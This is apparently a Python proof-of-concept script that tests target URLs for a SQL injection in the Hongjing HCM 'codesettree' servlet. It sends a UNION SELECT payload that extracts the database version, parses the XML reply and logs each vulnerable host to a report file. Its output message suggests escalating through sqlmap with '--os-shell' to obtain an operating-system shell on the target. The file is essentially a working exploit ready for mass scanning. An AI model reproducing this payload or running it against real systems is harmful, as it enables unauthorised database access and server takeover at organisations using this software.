import requests
import time
import buter
import wirtefile
import xml.etree.ElementTree as ET
filename = "./reps/宏景HCMcodesettreeSQL注入-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
poc = "/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&codesetid=1&flag=c&parentid=-1&status=1"

def hjhcmsql(url):
    try:
        reps = requests.get(url=url+poc, headers=headers, verify=False, timeout=5)
        if reps.status_code == 200 and 'TreeNode id="hongjing" text="hongjing' in reps.text:
                reptext = reps.text
                # 使用 ElementTree 解析 XML
                root = ET.fromstring(reptext)
                # 获取目标 TreeNode 元素
                tree_node = root.find("TreeNode")
                # 提取 text 属性中的字符串
                value = tree_node.get("text")
                output = f"{url}\n{value}"
                print(buter.colors.GREEN + f"存在宏景 HCM codesettree SQL 注入漏洞 可根据ehr_SafeCodeEncode_tamper脚本进行sqlmap --os-shell url : {output}" + buter.colors.END)
                wirtefile.writefiles(filename,output)
        else:
            print(buter.colors.RED+ f"未发现宏景 HCM codesettree SQL 注入漏洞 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
